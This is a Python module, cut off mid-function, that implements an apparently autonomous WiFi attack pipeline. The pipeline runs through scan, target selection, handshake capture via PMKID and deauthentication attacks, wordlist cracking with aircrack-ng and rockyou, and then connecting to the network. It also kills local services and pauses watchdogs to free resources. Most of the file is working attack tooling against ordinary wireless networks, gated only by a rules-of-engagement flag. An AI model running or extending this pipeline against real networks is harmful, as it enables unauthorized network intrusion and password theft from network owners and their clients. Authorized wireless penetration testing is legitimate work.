"""Offline Mode — WiFi attack pipeline state machine.

Manages the full lifecycle: scan → select → capture → crack → connect.
Uses aircrack-ng suite for all WiFi operations, aircrack-ng CPU for cracking.

When SIMULATE=True, all subprocess calls are mocked for testing.
"""

import csv
import io
import logging
import os
import re
import signal
import subprocess
import threading
import time

from agent import db

# Persistent file log — survives crashes, readable after reconnect
_log_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs")
os.makedirs(_log_dir, exist_ok=True)
_file_logger = logging.getLogger("offline")
_file_logger.setLevel(logging.DEBUG)
_fh = logging.FileHandler(os.path.join(_log_dir, "offline.log"))
_fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
_file_logger.addHandler(_fh)

# ---------------------------------------------------------------------------
# Simulation mode — set via set_simulate() or NC_OFFLINE_SIM env var
# ---------------------------------------------------------------------------
SIMULATE = os.environ.get("NC_OFFLINE_SIM", "0") == "1"

def set_simulate(enabled: bool):
    global SIMULATE
    SIMULATE = enabled

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
STAGES = {
    0: "SCANNING",
    1: "SELECTING",
    2: "CAPTURING",
    3: "CRACKING",
    4: "CONNECTING",
    5: "ONLINE",
}

CAPTURE_DIR = "/root/nightcrawler/logs/captures"
SCAN_PREFIX = "/tmp/nc-wifi-scan"
CAPTURE_PREFIX = "/tmp/nc-capture"
WORDLISTS = [
    "/usr/share/wordlists/wifite.txt",
    "/usr/share/wordlists/rockyou.txt",
]

# External WiFi adapter for monitor mode (internal wlan0 stays connected)
EXT_IFACE = "wlan1"

# Known USB WiFi adapters and their drivers
# Format: (vendor_id, product_id): (driver_module_name, ko_filenames_list, description)
# ko_filenames_list is a list — modules are loaded in order (dependencies first).
KNOWN_ADAPTERS = {
    ("148f", "3572"): ("rt2800usb", ["rt2x00lib.ko", "rt2x00usb.ko", "rt2800lib.ko", "rt2800usb.ko"], "Ralink RT3572"),
    ("7392", "d811"): ("8821cu", ["8821cu.ko"], "Edimax AC600 (RTL8821CU)"),
    ("7392", "b811"): ("8188eu", ["8188eu.ko"], "Edimax N150 (RTL8188EUS)"),
    ("7392", "7811"): ("8188eu", ["8188eu.ko"], "Edimax EW-7811Un (RTL8188CUS)"),
}

# Preferred adapter order (first match wins) — RT3572 preferred for PMKID support
ADAPTER_PRIORITY = [("148f", "3572"), ("7392", "d811"), ("7392", "b811"), ("7392", "7811")]

# Module search paths
MODULE_PATHS = [
    "/root/nightcrawler/kernels/modules",
    "/sdcard/nightcrawler-kernels/modules_v5",
    "/lib/modules",
]

def _find_module(ko_name):
    """Find a .ko file in known paths."""
    for path in MODULE_PATHS:
        full = os.path.join(path, ko_name)
        if os.path.exists(full):
            return full
    return None


def _get_usb_adapters():
    """Scan lsusb for known WiFi adapters.
    Returns list of (vendor, product, driver_name, ko_file, description).
    """
    if SIMULATE:
        return [("7392", "d811", "8821cu", ["8821cu.ko"], "Edimax AC600 (RTL8821CU) [SIM]")]
    found = []
    try:
        r = subprocess.run(["lsusb"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            m = re.search(r'ID\s+([0-9a-fA-F]{4}):([0-9a-fA-F]{4})', line)
            if m:
                vid, pid = m.group(1).lower(), m.group(2).lower()
                key = (vid, pid)
                if key in KNOWN_ADAPTERS:
                    drv, ko_list, desc = KNOWN_ADAPTERS[key]
                    found.append((vid, pid, drv, ko_list, desc))
    except Exception:
        pass
    # Sort by priority
    found.sort(key=lambda x: ADAPTER_PRIORITY.index((x[0], x[1]))
               if (x[0], x[1]) in ADAPTER_PRIORITY else 99)
    return found


def _is_module_loaded(driver_name):
    """Check if a kernel module is already loaded."""
    try:
        r = subprocess.run(["lsmod"], capture_output=True, text=True, timeout=5)
        return driver_name in r.stdout
    except Exception:
        return False


def _load_adapter_module(driver_name, ko_names):
    """Load kernel module(s) for the adapter.

    Args:
        driver_name: Primary module name to check with lsmod.
        ko_names: A single .ko filename (str) or list of .ko filenames
                  to load in order (dependencies first).
    """
    if isinstance(ko_names, str):
        ko_names = [ko_names]
    if SIMULATE:
        _file_logger.info("SIM: Would load modules %s", ko_names)
        return True
    if _is_module_loaded(driver_name):
        _file_logger.info("Module %s already loaded", driver_name)
        return True
    for ko_name in ko_names:
        # Derive module name from filename (e.g., "rt2x00lib.ko" -> "rt2x00lib")
        mod_name = ko_name.replace(".ko", "")
        if _is_module_loaded(mod_name):
            _file_logger.info("Module %s already loaded, skipping", mod_name)
            continue
        ko_path = _find_module(ko_name)
        if not ko_path:
            _file_logger.error("Module %s not found in any search path", ko_name)
            return False
        try:
            r = subprocess.run(["insmod", ko_path], capture_output=True, text=True, timeout=10)
            _file_logger.info("insmod %s: rc=%d stderr=%s", ko_path, r.returncode, r.stderr.strip()[:100])
            if r.returncode != 0 and "File exists" not in r.stderr:
                _file_logger.error("Failed to load %s", ko_path)
                return False
        except Exception as e:
            _file_logger.error("insmod %s failed: %s", ko_name, e)
            return False
    return True


def _detect_ext_adapter():
    """Check if an external WiFi adapter is plugged in and its driver is loaded.
    Returns (interface_name, mon_interface_name) or (None, None).
    """
    if SIMULATE:
        return EXT_IFACE, EXT_IFACE + "mon"
    # Check for any wlan interface that isn't wlan0
    try:
        r = subprocess.run(["ip", "-o", "link", "show"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            for name in ["wlan1", "wlan2", "wlan3"]:
                if name + ":" in line or name + "@" in line:
                    return name, name + "mon"
    except Exception:
        pass
    return None, None


def detect_and_setup_adapter():
    """Auto-detect USB adapter, load driver, return adapter info.
    Called on every /api/offline/state poll to enable hot-plug detection.
    Returns dict with adapter status, or None if no adapter.
    """
    adapters = _get_usb_adapters()
    if not adapters:
        return None

    vid, pid, driver_name, ko_list, desc = adapters[0]  # Best adapter

    # Load module(s) if needed
    if not _is_module_loaded(driver_name):
        _file_logger.info("Auto-loading module(s) %s for %s", ko_list, desc)
        if _load_adapter_module(driver_name, ko_list):
            _push_feed("system", f"Loaded driver {driver_name} for {desc}")
            # Wait for interface to appear
            import time as _t
            _t.sleep(2)
        else:
            _push_feed("error", f"Failed to load driver(s) {ko_list} for {desc}")
            return {"detected": True, "driver_loaded": False,
                    "adapter": desc, "usb_id": f"{vid}:{pid}"}

    # Check if interface appeared
    iface, mon_iface = _detect_ext_adapter()
    return {
        "detected": True,
        "driver_loaded": True,
        "interface": iface or "",
        "monitor_interface": mon_iface or "",
        "adapter": desc,
        "driver": driver_name,
        "usb_id": f"{vid}:{pid}",
    }

# Simulated data for testing
_SIM_NETWORKS = [
    {"bssid": "AA:BB:CC:DD:EE:01", "ssid": "HomeNetwork", "channel": 6,
     "encryption": "WPA2", "signal": -42, "clients": 3, "wps": "No"},
    {"bssid": "AA:BB:CC:DD:EE:02", "ssid": "OfficeWiFi", "channel": 1,
     "encryption": "WPA2", "signal": -55, "clients": 7, "wps": "Yes"},
    {"bssid": "AA:BB:CC:DD:EE:03", "ssid": "Guest-5G", "channel": 36,
     "encryption": "WPA2", "signal": -68, "clients": 1, "wps": "No"},
    {"bssid": "AA:BB:CC:DD:EE:04", "ssid": "Neighbor_Net", "channel": 11,
     "encryption": "WPA2", "signal": -72, "clients": 2, "wps": "No"},
    {"bssid": "AA:BB:CC:DD:EE:05", "ssid": "", "channel": 3,
     "encryption": "WPA2", "signal": -80, "clients": 0, "wps": "No"},
    {"bssid": "AA:BB:CC:DD:EE:06", "ssid": "CoffeeShop", "channel": 6,
     "encryption": "OPN", "signal": -60, "clients": 12, "wps": "No"},
    {"bssid": "AA:BB:CC:DD:EE:07", "ssid": "IoT-Network", "channel": 1,
     "encryption": "WPA", "signal": -65, "clients": 4, "wps": "Yes"},
    {"bssid": "AA:BB:CC:DD:EE:08", "ssid": "SecureNet_5G", "channel": 44,
     "encryption": "WPA3", "signal": -50, "clients": 5, "wps": "No"},
]

_SIM_CLIENTS = {
    "AA:BB:CC:DD:EE:01": ["FF:11:22:33:44:01", "FF:11:22:33:44:02", "FF:11:22:33:44:03"],
    "AA:BB:CC:DD:EE:02": ["FF:11:22:33:44:04", "FF:11:22:33:44:05"],
}

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
_state = {
    "stage": 5,  # Start as ONLINE (will be set to 0 if WiFi is down)
    "stage_name": "ONLINE",
    "target_ssid": "",
    "target_bssid": "",
    "target_channel": 0,
    "target_encryption": "",
    "handshake_captured": False,
    "capture_file": "",
    "crack_progress": 0.0,
    "crack_speed": "",
    "crack_candidates": 0,
    "crack_total": 0,
    "crack_eta": "",
    "crack_wordlist": "",
    "password": "",
    "started_at": "",
    "deauth_count": 0,
    "deauth_max": 5,
    "error": "",
}

_wifi_feed = []  # Attack log entries
_scan_proc = None
_capture_proc = None
_deauth_thread = None
_crack_proc = None
_lock = threading.Lock()


def _now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def _ts():
    return time.strftime("%H:%M:%S")


def _push_feed(event_type, content):
    """Add entry to the WiFi attack log."""
    global _wifi_feed
    entry = {"ts": _ts(), "type": event_type, "content": content[:500]}
    _wifi_feed.append(entry)
    if len(_wifi_feed) > 500:
        _wifi_feed = _wifi_feed[-500:]
    # Persist to SQLite
    try:
        db.set_state("wifi_feed", _wifi_feed)
    except Exception:
        pass
    # Persist to file log (survives crashes)
    _file_logger.info("[%s] %s", event_type.upper(), content[:500])


def _set_stage(stage_num):
    """Update pipeline stage."""
    old = _state["stage_name"]
    _state["stage"] = stage_num
    _state["stage_name"] = STAGES.get(stage_num, "UNKNOWN")
    _file_logger.info("STAGE TRANSITION: %s -> %s", old, _state["stage_name"])
    _persist_state()


def _persist_state():
    """Save state to SQLite."""
    try:
        db.set_state("offline_state", {**_state})
    except Exception:
        pass


def _restart_services_for_online():
    """Restart agent + llama-server after WiFi connects."""
    if SIMULATE:
        _file_logger.info("SIM: Would restart agent + llama-server")
        return
    try:
        # Remove agent watchdog pause
        if os.path.exists("/tmp/nc-agent-pause"):
            os.remove("/tmp/nc-agent-pause")
        _file_logger.info("Agent watchdog unpaused")
    except Exception:
        pass
    try:
        # Remove llama-server watchdog pause — watchdog will auto-restart it
        subprocess.run(
            ["ssh", "-p", "9022", "-o", "ConnectTimeout=3",
             "shell@127.0.0.1",
             "rm -f /data/local/tmp/nc-llama-pause"],
            capture_output=True, timeout=10)
        _file_logger.info("llama-server watchdog unpaused — will auto-restart within 30s")
        _push_feed("system", "llama-server watchdog unpaused — auto-restarting (~3 min warmup)")
    except Exception as e:
        _file_logger.warning("Failed to unpause llama watchdog: %s", e)
    try:
        # Restart Tailscale — it loses connectivity when WiFi reconnects after offline mode
        subprocess.run(
            ["ssh", "-p", "9022", "-o", "ConnectTimeout=3",
             "shell@127.0.0.1",
             "tailscale down 2>/dev/null; sleep 2; tailscale up --accept-routes --accept-dns=false &"],
            capture_output=True, timeout=15)
        _file_logger.info("Tailscale restarted for WiFi reconnection")
        _push_feed("system", "Tailscale restarted (WiFi reconnected)")
    except Exception as e:
        _file_logger.warning("Failed to restart Tailscale: %s", e)
    try:
        # Restart agent (will auto-start webui if needed)
        subprocess.Popen(
            ["nohup", "python3", "main.py"],
            stdout=open("/tmp/nc-agent.log", "a"),
            stderr=subprocess.STDOUT,
            cwd="/root/nightcrawler",
        )
        _file_logger.info("Started agent")
        _push_feed("system", "Agent starting — will begin scanning once LLM is ready")
    except Exception as e:
        _file_logger.warning("Failed to start agent: %s", e)


def _kill_services_for_offline():
    """Kill agent + llama-server to free RAM/GPU for offline mode."""
    if SIMULATE:
        _file_logger.info("SIM: Would kill agent + llama-server")
        return
    try:
        # Kill the pentest agent — match exact "python3 main.py" but not Claude/other tools
        # Use pgrep with exact match on the full command line
        r = subprocess.run(
            ["pgrep", "-a", "-f", "python3 main.py"],
            capture_output=True, text=True, timeout=5)
        for line in r.stdout.strip().split("\n"):
            if not line.strip():
                continue
            pid = line.split()[0]
            # Only kill if it's the nightcrawler agent (contains "main.py" but not "claude")
            if "main.py" in line and "claude" not in line.lower():
                subprocess.run(["kill", "-9", pid], capture_output=True, timeout=5)
                _file_logger.info("Killed agent PID %s (%s)", pid, line.strip()[:60])
                _push_feed("system", "Stopped pentest agent (freeing RAM)")
                break
    except Exception as e:
        _file_logger.warning("Failed to kill agent: %s", e)
    try:
        # Pause the llama-server watchdog FIRST (so it doesn't restart)
        subprocess.run(
            ["ssh", "-p", "9022", "-o", "ConnectTimeout=3",
             "shell@127.0.0.1",
             "echo offline > /data/local/tmp/nc-llama-pause"],
            capture_output=True, timeout=10)
        _file_logger.info("llama-server watchdog paused via /data/local/tmp/nc-llama-pause")
    except Exception as e:
        _file_logger.warning("Failed to pause llama watchdog: %s", e)
    try:
        # Kill llama-server to free ~3.2GB GPU RAM
        r = subprocess.run(
            ["ssh", "-p", "9022", "-o", "ConnectTimeout=3",
             "shell@127.0.0.1", "pkill -9 -f llama-server"],
            capture_output=True, timeout=10)
        _file_logger.info("Killed llama-server: rc=%d", r.returncode)
        _push_feed("system", "Stopped llama-server (freeing ~3.2GB GPU RAM)")
    except Exception as e:
        _file_logger.warning("Failed to kill llama-server: %s", e)
    try:
        # Pause the agent watchdog so it doesn't restart the agent
        with open("/tmp/nc-agent-pause", "w") as f:
            f.write("offline-mode")
        _file_logger.info("Agent watchdog paused")
    except Exception:
        pass


def _kill_proc(proc):
    """Safely kill a subprocess."""
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, OSError):
            pass
        try:
            proc.kill()
        except (ProcessLookupError, OSError):
            pass


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def get_state():
    """Return full offline state dict."""
    return {**_state, "wifi_feed": _wifi_feed[-200:]}


def is_offline():
    """Check if device is in offline mode (no WiFi connection)."""
    if SIMULATE:
        return _state["stage"] < 5
    from agent.net_detect import is_wifi_connected
    return not is_wifi_connected()


def init_state():
    """Initialize state from SQLite (call on startup).

    Clears stale wifi_networks from previous sessions — networks should
    only appear after a fresh scan. Feed and handshakes persist.
    """
    global _wifi_feed, _state
    try:
        saved = db.get_state("offline_state", None)
        if saved and isinstance(saved, dict):
            _state.update(saved)
        saved_feed = db.get_state("wifi_feed", [])
        if saved_feed:
            _wifi_feed = saved_feed

        # Reset stale capture/crack state after reboot — processes are dead
        # but state was persisted. Check if processes are actually running.
        if _state.get("stage") in (2, 3):  # CAPTURING or CRACKING
            has_airodump = subprocess.run(
                ["pgrep", "-f", "airodump-ng"], capture_output=True).returncode == 0
            has_aircrack = subprocess.run(
                ["pgrep", "-f", "aircrack-ng"], capture_output=True).returncode == 0
            has_hcxdumptool = subprocess.run(
                ["pgrep", "-f", "hcxdumptool"], capture_output=True).returncode == 0
            if not has_airodump and not has_aircrack and not has_hcxdumptool:
                # Check if we have a valid capture file — preserve it for re-cracking
                cap = _state.get("capture_file", "")
                full_cap = os.path.join("/root/nightcrawler", cap) if cap else ""
                if cap and os.path.exists(full_cap):
                    # Have a capture file — reset to SCANNING but keep handshake data
                    _file_logger.info("init_state: stale stage %s, processes dead, but capture file exists: %s",
                                      _state.get("stage_name", "?"), cap)
                    _state["stage"] = 0
                    _state["stage_name"] = "SCANNING"
                    _state["capture_tool"] = ""
                    _state["deauth_count"] = 0
                    # Keep capture_file and handshake_captured so crack can be re-triggered
                    _persist_state()
                    _push_feed("system", "Reboot detected — capture file preserved, crack can be restarted")
                else:
                    _file_logger.info("init_state: stale stage %s with no processes, no capture file — full reset",
                                      _state.get("stage_name", "?"))
                    _state["stage"] = 0
                    _state["stage_name"] = "SCANNING"
                    _state["capture_tool"] = ""
                    _state["deauth_count"] = 0
                    _state["capture_file"] = ""
                    _state["handshake_captured"] = False
                    _persist_state()
                    _push_feed("system", "Reboot detected — reset from stale capture to SCANNING")

        # Clear stale scan results — networks only persist within a session
        conn = db._get_conn()
        conn.execute("DELETE FROM wifi_networks")
        conn.commit()
        # Also clear stale CSV files so parse_scan_csv doesn't re-read old data
        for f in os.listdir("/tmp"):
            if f.startswith("nc-wifi-scan") or f.startswith("nc-capture"):
                try:
                    os.remove(os.path.join("/tmp", f))
                except Exception:
                    pass
        _file_logger.info("init_state: cleared stale wifi_networks + CSV files")

        # Restore handshake state from DB — if we have cracked handshakes,
        # reflect that in _state so the UI shows the correct status
        try:
            cracked = conn.execute(
                "SELECT bssid, ssid, capture_file, password FROM wifi_handshakes "
                "WHERE cracked=1 ORDER BY captured_at DESC LIMIT 1"
            ).fetchone()
            if cracked and cracked[3]:
                # If _state has no target but we have a cracked network, restore it
                if not _state.get("target_bssid"):
                    _state["target_bssid"] = cracked[0]
                    _state["target_ssid"] = cracked[1]
                    _state["capture_file"] = cracked[2] or ""
                    _state["password"] = cracked[3]
                    _state["handshake_captured"] = True
                    _file_logger.info("init_state: restored cracked network %s from DB", cracked[1])
                # If _state target matches a cracked network, ensure password is set
                elif _state.get("target_bssid") == cracked[0] and not _state.get("password"):
                    _state["password"] = cracked[3]
                    _state["handshake_captured"] = True
                    _file_logger.info("init_state: restored password for target %s from DB", cracked[1])
                _persist_state()
        except Exception:
            pass
    except Exception:
        pass


def start_scan():
    """Put wlan0 into monitor mode and start airodump-ng scanning."""
    global _scan_proc
    with _lock:
        if _state["stage"] not in (0, 1, 5):
            return {"error": "Cannot scan in current stage"}

        _set_stage(0)
        _state["started_at"] = _now()
        _state["error"] = ""
        _push_feed("scan", "Starting WiFi scan...")

        if SIMULATE:
            _push_feed("scan", f"[SIM] Found {len(_SIM_NETWORKS)} networks")
            # Populate DB with simulated networks
            try:
                conn = db._get_conn()
                for net in _SIM_NETWORKS:
                    conn.execute("""
                        INSERT OR REPLACE INTO wifi_networks
                        (bssid, ssid, channel, encryption, signal, clients, wps, first_seen, last_seen)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """, (net["bssid"], net["ssid"], net["channel"], net["encryption"],
                          net["signal"], net["clients"], net["wps"], _now(), _now()))
                conn.commit()
            except Exception:
                pass
            _set_stage(1)  # Move to SELECTING
            _push_feed("scan", f"Scan complete — {len(_SIM_NETWORKS)} networks discovered")
            return {"ok": True, "networks": len(_SIM_NETWORKS)}

        # Real mode: external adapter → load driver → monitor mode → airodump-ng
        # Internal wlan0 stays connected (Tailscale/SSH stays up)
        try:
            # Step 1: Load driver if needed (only here, not during polls)
            usb_adapters = _get_usb_adapters()
            if usb_adapters:
                vid, pid, driver_name, ko_list, desc = usb_adapters[0]
                _state["_adapter_usb_id"] = f"{vid}:{pid}"
                if not _is_module_loaded(driver_name):
                    _push_feed("scan", f"Loading driver(s) {ko_list} for {desc}...")
                    _file_logger.info("Loading module(s) %s for %s", ko_list, desc)
                    if _load_adapter_module(driver_name, ko_list):
                        _push_feed("scan", f"Driver {driver_name} loaded")
                        time.sleep(3)  # Wait for interface to appear
                    else:
                        _state["error"] = f"Failed to load driver(s) {ko_list}"
                        _push_feed("error", f"Driver load failed: {ko_list}")
                        return {"error": _state["error"]}

            # Step 2: Check for the network interface
            ext_iface, ext_mon = _detect_ext_adapter()
            if not ext_iface:
                _state["error"] = f"External WiFi adapter not found (expected: {EXT_IFACE}). Plug in a USB adapter."
                _push_feed("error", f"No external adapter detected. Plug in USB WiFi adapter ({EXT_IFACE}).")
                _file_logger.error("No external adapter: %s not found", EXT_IFACE)
                return {"error": _state["error"]}

            _push_feed("scan", f"External adapter detected: {ext_iface}")
            _file_logger.info("External adapter: %s", ext_iface)

            # Kill interfering processes on the external adapter only
            _file_logger.info("CMD: airmon-ng check kill")
            r0 = subprocess.run(["airmon-ng", "check", "kill"],
                                capture_output=True, text=True, timeout=10)
            _file_logger.info("airmon-ng check kill: rc=%d stdout=%s",
                              r0.returncode, r0.stdout[:200])
            _push_feed("scan", "Killed interfering processes")

            # Start monitor mode on external adapter
            mon_iface = None
            _file_logger.info("CMD: airmon-ng start %s", ext_iface)
            r = subprocess.run(["airmon-ng", "start", ext_iface],
                               capture_output=True, text=True, timeout=10)
            _file_logger.info("airmon-ng start %s: rc=%d stdout=%s stderr=%s",
                              ext_iface, r.returncode, r.stdout[:300], r.stderr[:200])

            # Check for the mon interface (e.g. wlan1mon)
            r_check = subprocess.run(["ip", "link", "show", ext_mon],
                                     capture_output=True, text=True, timeout=5)
            if r_check.returncode == 0:
                mon_iface = ext_mon
                _push_feed("scan", f"Monitor mode enabled ({ext_mon})")
            else:
                # Some drivers put the same interface in monitor mode
                r_check2 = subprocess.run(["iw", "dev", ext_iface, "info"],
                                          capture_output=True, text=True, timeout=5)
                _file_logger.info("iw dev %s info: %s", ext_iface, r_check2.stdout.strip()[:300])
                if "type monitor" in r_check2.stdout:
                    mon_iface = ext_iface
                    _push_feed("scan", f"Monitor mode on {ext_iface} (no mon interface created)")
                else:
                    # Try iw directly
                    _file_logger.info("airmon-ng failed, trying iw on %s", ext_iface)
                    for cmd, desc in [
                        (["ip", "link", "set", ext_iface, "down"], f"{ext_iface} down"),
                        (["iw", "dev", ext_iface, "set", "type", "monitor"], "set monitor"),
                        (["ip", "link", "set", ext_iface, "up"], f"{ext_iface} up"),
                    ]:
                        ri = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                        _file_logger.info("%s: rc=%d stderr=%s", desc, ri.returncode, ri.stderr.strip()[:100])

                    r_check3 = subprocess.run(["iw", "dev", ext_iface, "info"],
                                              capture_output=True, text=True, timeout=5)
                    if "type monitor" in r_check3.stdout:
                        mon_iface = ext_iface
                        _push_feed("scan", f"Monitor mode on {ext_iface} via iw")
                    else:
                        _state["error"] = f"Monitor mode failed on {ext_iface}"
                        _push_feed("error", f"Monitor mode failed on {ext_iface}. Check logs/offline.log")
                        _file_logger.error("MONITOR MODE FAILED on %s", ext_iface)
                        return {"error": _state["error"]}

            _state["_mon_iface"] = mon_iface
            _state["_ext_iface"] = ext_iface

            # Clean old scan files
            for f in os.listdir("/tmp"):
                if f.startswith("nc-wifi-scan"):
                    os.remove(os.path.join("/tmp", f))

            # Start airodump-ng on the external monitor interface
            _scan_proc = subprocess.Popen(
                ["airodump-ng", mon_iface,
                 "--write-interval", "3",
                 "--output-format", "csv",
                 "-w", SCAN_PREFIX],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid,
            )
            _push_feed("scan", f"airodump-ng started on {mon_iface} (PID {_scan_proc.pid})")
            _push_feed("scan", "Scanning for 60s...")

            # Auto-stop after 60s and transition to SELECTING
            scan_ref = _scan_proc
            def _auto_stop_scan():
                global _scan_proc
                time.sleep(60)
                _kill_proc(scan_ref)
                with _lock:
                    if _scan_proc is scan_ref:
                        _scan_proc = None
                    parse_scan_csv()
                    nets = get_networks()
                    _push_feed("scan", f"Scan complete — {len(nets)} networks discovered")
                    _file_logger.info("Auto-stop scan: %d networks found", len(nets))
                    # Only transition to SELECTING if we're still in SCANNING.
                    # If the user already selected a target or started capture,
                    # don't regress the stage (race condition fix).
                    if _state["stage"] == 0:  # Still SCANNING
                        _set_stage(1)  # SELECTING
                    else:
                        _file_logger.info("Scan timer fired but stage already at %s — not regressing",
                                          _state["stage_name"])

            threading.Thread(target=_auto_stop_scan, daemon=True).start()
            return {"ok": True}

        except Exception as e:
            _state["error"] = str(e)
            _push_feed("error", f"Scan failed: {e}")
            return {"error": str(e)}


def stop_scan():
    """Stop airodump-ng scanning."""
    global _scan_proc
    with _lock:
        _kill_proc(_scan_proc)
        _scan_proc = None
        _push_feed("scan", "Scan stopped")
        _persist_state()
        return {"ok": True}


def get_networks():
    """Return discovered WiFi networks from DB."""
    try:
        conn = db._get_conn()
        rows = conn.execute(
            "SELECT bssid, ssid, channel, encryption, signal, clients, wps, first_seen, last_seen "
            "FROM wifi_networks ORDER BY signal DESC"
        ).fetchall()
        return [
            {"bssid": r[0], "ssid": r[1] or "(hidden)", "channel": r[2],
             "encryption": r[3], "signal": r[4], "clients": r[5],
             "wps": r[6], "first_seen": r[7], "last_seen": r[8]}
            for r in rows
        ]
    except Exception:
        return []


def parse_scan_csv():
    """Parse airodump-ng CSV output and update DB.

    Called periodically by the webui poll or a background thread.
    """
    if SIMULATE:
        return  # simulated data already in DB

    csv_file = None
    for f in sorted(os.listdir("/tmp"), reverse=True):
        if f.startswith("nc-wifi-scan") and f.endswith(".csv"):
            csv_file = os.path.join("/tmp", f)
            break

    if not csv_file or not os.path.exists(csv_file):
        return

    try:
        with open(csv_file, "r", errors="ignore") as fh:
            content = fh.read()

        # airodump CSV has two sections separated by blank line
        # Section 1: BSSIDs (APs)  Section 2: Clients
        # Handle both \r\n and \n line endings
        content = content.replace("\r\n", "\n")
        sections = content.split("\n\n")
        if not sections:
            return

        # Parse APs
        ap_section = sections[0].strip()
        if not ap_section:
            return

        reader = csv.reader(io.StringIO(ap_section))
        header = None
        conn = db._get_conn()

        for row in reader:
            row = [c.strip() for c in row]
            if not row or len(row) < 10:
                continue
            if row[0] == "BSSID":
                header = row
                continue
            if not header:
                continue

            bssid = row[0]
            if not re.match(r'^[0-9A-Fa-f:]{17}$', bssid):
                continue

            channel = int(row[3]) if row[3].strip().isdigit() else 0
            signal = int(row[8]) if row[8].strip().lstrip("-").isdigit() else 0
            encryption = row[5] if len(row) > 5 else ""
            ssid = row[13] if len(row) > 13 else ""
            wps = row[10] if len(row) > 10 else ""

            conn.execute("""
                INSERT OR REPLACE INTO wifi_networks
                (bssid, ssid, channel, encryption, signal, wps, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, COALESCE((SELECT first_seen FROM wifi_networks WHERE bssid=?), ?), ?)
            """, (bssid, ssid, channel, encryption, signal, wps, bssid, _now(), _now()))

        # Parse clients (section 2) — count per BSSID
        if len(sections) > 1:
            client_section = sections[1].strip()
            client_counts = {}
            reader2 = csv.reader(io.StringIO(client_section))
            for row in reader2:
                row = [c.strip() for c in row]
                if len(row) >= 6 and re.match(r'^[0-9A-Fa-f:]{17}$', row[0]):
                    ap_bssid = row[5] if len(row) > 5 else ""
                    if re.match(r'^[0-9A-Fa-f:]{17}$', ap_bssid):
                        client_counts[ap_bssid] = client_counts.get(ap_bssid, 0) + 1

            for bssid, count in client_counts.items():
                conn.execute("UPDATE wifi_networks SET clients=? WHERE bssid=?",
                             (count, bssid))

        conn.commit()

    except Exception:
        pass


def select_target(bssid, confirm_roe=False):
    """Select a target network and automatically begin capture.

    The pipeline is autonomous after target selection:
    select → capture (auto) → crack (auto) → connect (manual)
    """
    global _scan_proc
    with _lock:
        if not confirm_roe:
            return {"error": "ROE confirmation required"}

        # Kill any running scan so its timer can't regress the stage later
        if _scan_proc is not None:
            _kill_proc(_scan_proc)
            _scan_proc = None
            _push_feed("scan", "Scan stopped — target selected")

        nets = get_networks()
        target = next((n for n in nets if n["bssid"] == bssid), None)
        if not target:
            return {"error": f"Network {bssid} not found"}

        _state["target_ssid"] = target["ssid"]
        _state["target_bssid"] = bssid
        _state["target_channel"] = target["channel"]
        _state["target_encryption"] = target["encryption"]
        _state["handshake_captured"] = False
        _state["capture_file"] = ""
        _state["password"] = ""
        _state["crack_progress"] = 0.0
        _state["deauth_count"] = 0
        _state["error"] = ""
        _set_stage(1)

        _push_feed("target", f"Target selected: {target['ssid']} ({bssid}) CH{target['channel']}")

        # Check if this network was previously cracked
        try:
            conn = db._get_conn()
            row = conn.execute(
                "SELECT capture_file, password FROM wifi_handshakes WHERE bssid=? AND cracked=1",
                (bssid,)).fetchone()
            if row and row[1]:
                _state["handshake_captured"] = True
                _state["capture_file"] = row[0] or ""
                _state["password"] = row[1]
                _push_feed("system", f"Previously cracked: {target['ssid']} — password: {row[1]}")
                _set_stage(4)  # CONNECTING
                _persist_state()
                return {"ok": True, "resumed": True, "password": row[1]}
        except Exception:
            pass

        _push_feed("target", "Auto-starting capture pipeline...")

    # Auto-start capture (outside the lock — start_capture acquires its own)
    result = start_capture()
    if result.get("error"):
        _push_feed("error", f"Auto-capture failed: {result['error']}")
    return {"ok": True, "target": target}


# Capture cycle timing
AIRODUMP_DURATION = 810  # 13.5 min per capture cycle
_capture_thread = None
_capture_stop = threading.Event()


def start_capture():
    """Start dual-tool handshake capture on the selected target.

    Alternates between:
    - hcxdumptool (3 min) — PMKID attack + clientless auth, no clients needed
    - airodump-ng + deauth (3 min) — classic handshake capture, needs clients
    Repeats until handshake is captured or stopped.
    """
    global _scan_proc, _capture_proc, _capture_thread
    with _lock:
        if not _state["target_bssid"]:
            return {"error": "No target selected"}

        # Kill any running scan so its timer can't regress the stage later
        if _scan_proc is not None:
            _kill_proc(_scan_proc)
            _scan_proc = None
            _push_feed("scan", "Scan stopped — capture starting")

        _capture_stop.clear()
        _set_stage(2)
        bssid = _state["target_bssid"]
        channel = _state["target_channel"]
        ssid = _state["target_ssid"]
        _state["capture_tool"] = ""
        _state["capture_cycle"] = 0
        _push_feed("capture", f"Starting dual-tool capture on {ssid} CH{channel}")

        if SIMULATE:
            def _sim_capture():
                _state["capture_tool"] = "hcxdumptool"
                _push_feed("capture", "[hcxdumptool] PMKID + clientless handshake (3 min)")
                time.sleep(2)
                _state["capture_tool"] = "airodump-ng"
                _push_feed("capture", "[airodump-ng] Deauth + handshake capture (3 min)")
                _state["deauth_count"] = 1
                _push_feed("deauth", "Deauth sent to client FF:11:22:33:44:01 (1/5)")
                time.sleep(2)
                _state["deauth_count"] = 2
                _push_feed("deauth", "Deauth sent to client FF:11:22:33:44:02 (2/5)")
                time.sleep(3)
                cap_file = f"logs/captures/{ssid.replace(' ', '_')}-{int(time.time())}.cap"
                os.makedirs(CAPTURE_DIR, exist_ok=True)
                with open(os.path.join("/root/nightcrawler", cap_file), "wb") as f:
                    f.write(b"SIMULATED_PCAP_DATA")
                _state["handshake_captured"] = True
